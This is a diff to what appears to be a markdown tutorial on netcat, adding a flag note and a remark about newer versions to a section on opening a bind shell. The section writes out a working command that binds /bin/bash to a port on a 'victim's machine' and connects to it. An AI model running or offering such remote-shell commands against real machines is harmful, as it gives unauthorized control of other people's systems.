@@ -70,7 +70,8 @@ This is really bad!
 On a victim's machine, run a listener that forwards requests to `bash`:
 
 ```
-nc -l 8888 -e "/bin/bash"
+# note that the '-p' flag should be omitted on macOS
+nc -lp 8888 -e "/bin/bash"
 ```
 
 Open a connection:
@@ -81,3 +82,4 @@ nc <victim's host> 8888
 
 Now you've opened a bind shell to the victim's machine.
 
+Newer versions of netcat don't let you forward requests using `-e` anymore, due to the obvious security risk.
